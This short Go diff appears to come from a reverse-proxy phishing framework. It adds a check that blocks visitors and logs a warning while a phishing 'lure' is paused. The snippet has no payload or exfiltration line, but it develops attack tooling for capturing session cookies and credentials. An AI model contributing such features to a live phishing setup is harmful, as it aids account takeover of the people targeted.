@@ -273,6 +273,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						// session cookie not found
 						if !p.cfg.IsSiteHidden(pl_name) {
 							if l != nil {
+								// check if lure is not paused
+								if l.PausedUntil > 0 && time.Unix(l.PausedUntil, 0).After(time.Now()) {
+									log.Warning("[%s] lure is paused: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
+									return p.blockRequest(req)
+								}
 
 								// check if lure user-agent filter is triggered
 								if len(l.UserAgentFilter) > 0 {
